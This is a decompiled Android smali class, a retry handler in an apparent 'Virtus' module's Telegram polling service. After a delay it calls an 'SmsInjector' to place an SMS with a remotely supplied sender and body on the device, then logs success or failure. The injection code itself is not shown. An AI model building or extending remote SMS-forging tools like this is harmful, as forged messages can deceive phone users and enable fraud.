.class Lcom/virtus/module/TelegramPollingService$4;
.super Ljava/lang/Object;
.source "TelegramPollingService.java"

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/virtus/module/TelegramPollingService;->retryLater(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Lcom/virtus/module/TelegramPollingService;

.field final synthetic val$body:Ljava/lang/String;

.field final synthetic val$childId:Ljava/lang/String;

.field final synthetic val$sender:Ljava/lang/String;


# direct methods
.method constructor <init>(Lcom/virtus/module/TelegramPollingService;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 0
    .annotation system Ldalvik/annotation/MethodParameters;
        accessFlags = {
            0x8010,
            0x1010,
            0x1010,
            0x1010
        }
        names = {
            null,
            null,
            null,
            null
        }
    .end annotation

    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()V"
        }
    .end annotation

    .line 392
    iput-object p1, p0, Lcom/virtus/module/TelegramPollingService$4;->this$0:Lcom/virtus/module/TelegramPollingService;

    iput-object p2, p0, Lcom/virtus/module/TelegramPollingService$4;->val$sender:Ljava/lang/String;

    iput-object p3, p0, Lcom/virtus/module/TelegramPollingService$4;->val$body:Ljava/lang/String;

    iput-object p4, p0, Lcom/virtus/module/TelegramPollingService$4;->val$childId:Ljava/lang/String;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 3

    const-wide/16 v0, 0x1388

    .line 395
    :try_start_0
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    .line 396
    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService$4;->this$0:Lcom/virtus/module/TelegramPollingService;

    invoke-static {v0}, Lcom/virtus/module/TelegramPollingService;->access$000(Lcom/virtus/module/TelegramPollingService;)Z

    move-result v0

    if-nez v0, :cond_0

    goto :goto_0

    .line 397
    :cond_0
    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService$4;->this$0:Lcom/virtus/module/TelegramPollingService;

    iget-object v1, p0, Lcom/virtus/module/TelegramPollingService$4;->val$sender:Ljava/lang/String;

    iget-object v2, p0, Lcom/virtus/module/TelegramPollingService$4;->val$body:Ljava/lang/String;

    invoke-static {v0, v1, v2}, Lcom/virtus/module/SmsInjector;->inject(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v0

    .line 398
    const-string v1, "VirtusModule"

    if-eqz v0, :cond_1

    .line 399
    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService$4;->this$0:Lcom/virtus/module/TelegramPollingService;

    iget-object v2, p0, Lcom/virtus/module/TelegramPollingService$4;->val$childId:Ljava/lang/String;

    invoke-static {v0, v2}, Lcom/virtus/module/TelegramPollingService;->access$600(Lcom/virtus/module/TelegramPollingService;Ljava/lang/String;)V

    .line 400
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "retry inject OK for "

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lcom/virtus/module/TelegramPollingService$4;->val$sender:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    .line 402
    :cond_1
    new-instance v0, Ljava/lang/StringBuilder;

    const-string v2, "retry inject FAILED for "

    invoke-direct {v0, v2}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v2, p0, Lcom/virtus/module/TelegramPollingService$4;->val$sender:Ljava/lang/String;

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, " \u2014 node stays in FB"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    :catch_0
    :goto_0
    return-void
.end method
